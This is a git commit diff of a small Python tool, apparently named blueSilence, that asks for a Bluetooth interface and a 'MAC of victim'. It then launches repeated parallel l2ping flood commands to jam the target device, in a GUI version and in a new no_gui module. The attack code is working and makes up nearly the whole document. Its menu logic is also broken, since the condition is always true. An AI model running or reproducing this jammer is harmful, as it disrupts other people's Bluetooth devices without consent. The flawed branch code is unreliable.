448b02a4729a43e1ae88ea97ffe1e5cbec9c84cd
void <fluffy.siberian.cat@gmail.com>
2023-04-29 11:52:02 +1000

    V 1.1

--- blueSilence.py
+++ blueSilence.py
@@ -1,5 +1,6 @@
 import os
 import subprocess
+import no_gui
 import time
 import colorama
 from colorama import Fore, Back, Style
@@ -9,17 +10,30 @@ colorama.init(autoreset=True)
 def start():
     headers.header()
 start()
-interface = input("Your BT interface : ")
-mac = input("MAC of victim: ")
-time = 999
-print("Start jamming...")
-delay = int(time)
 
-while delay != 0:
-    xterm_1 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
-    xterm_2 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
-    xterm_3 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
-    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    delay -= 1
+def main():
+
+    interface = input("Your BT interface : ")
+    mac = input("MAC of victim: ")
+    time = 999
+    print("Start jamming...")
+    delay = int(time)
+
+    while delay != 0:
+        xterm_1 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
+        xterm_2 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
+        xterm_3 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
+        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        delay -= 1
+
+choose = input("Do you have GUI? y/N")
+if input == "y" or "Y" :
+    main()
+elif input == "n" or "N" :
+    no_gui.no_gui()
+else:
+    print("ERROR")
+    print("Executing no GUI version")
+    no_gui.no_gui()
---
+++ no_gui.py
@@ -0,0 +1,17 @@
+import subprocess
+
+def no_gui():
+    interface = input("Your BT interface : ")
+    mac = input("MAC of victim: ")
+    time = 999
+    print("Start jamming...")
+    delay = int(time)
+
+    while delay != 0:
+        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        delay -= 1
